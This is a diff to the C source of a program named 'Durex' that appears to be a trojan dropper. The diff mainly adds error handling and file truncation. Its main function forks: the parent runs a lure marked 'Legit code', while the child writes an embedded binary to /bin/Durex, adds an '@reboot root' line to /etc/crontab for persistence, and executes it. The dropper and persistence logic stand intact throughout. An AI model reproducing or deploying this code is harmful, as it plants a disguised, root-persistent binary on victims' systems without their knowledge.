@@ -16,15 +16,20 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <errno.h>
 
 extern int stub[];
 extern size_t stub_len;
 
+/*
+ * Writes @blen bytes of @bin file in @bpath.
+ * Creates the file if it doesn't exists. Overrides it if it does.
+*/
 int write_binary(void *bin, size_t blen, const char *bpath)
 {
 	int fd;
 
-	fd = open(bpath, O_WRONLY | O_CREAT, S_IRWXU);
+	fd = open(bpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);
 	if (fd < 0)
 		return (-1);
 
@@ -38,12 +43,15 @@ int add_crontab_entry(const char *cpath, const char *bpath)
 {
 	int fd;
 	char *cmd;
+	int ret;
 
+	printf("executed\n");
 	fd = open(cpath, O_RDWR | O_APPEND);
 	if (fd < 0)
 		return (-1);
 
-	if (!ft_strnf(fd, bpath))
+	ret = ft_strnf(fd, bpath);
+	if (ret == 0)
 	{
 		cmd = ft_strcat("@reboot root ", bpath);
 		if (cmd == NULL)
@@ -51,12 +59,11 @@ int add_crontab_entry(const char *cpath, const char *bpath)
 			close(fd);
 			return (-1);
 		}
-
 		dprintf(fd, "%s\n", cmd);
 	}
 
 	close(fd);
-	return (0);
+	return (ret < 0 ? -1 : 0);
 }
 
 /*
@@ -70,7 +77,12 @@ int main(void)
 	int pid;
 
 	pid = fork();
-	if (pid > 0)
+	if (pid < 0)
+	{
+		perror("Durex fork");
+		exit(EXIT_FAILURE);
+	}
+	else if (pid > 0)
 	{
 		// Legit code
 		lure();
@@ -86,16 +98,15 @@ int main(void)
 
 		if (write_binary(stub, stub_len, "/bin/Durex") < 0)
 		{
-			perror("Durex");
+			perror("Durex write");
 			exit(EXIT_FAILURE);
 		}
 
 		if (add_crontab_entry("/etc/crontab", "/bin/Durex") < 0)
 		{
-			perror("Durex");
+			perror("Durex cron");
 			exit(EXIT_FAILURE);
 		}
-
 		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
 	}
 	return (0);
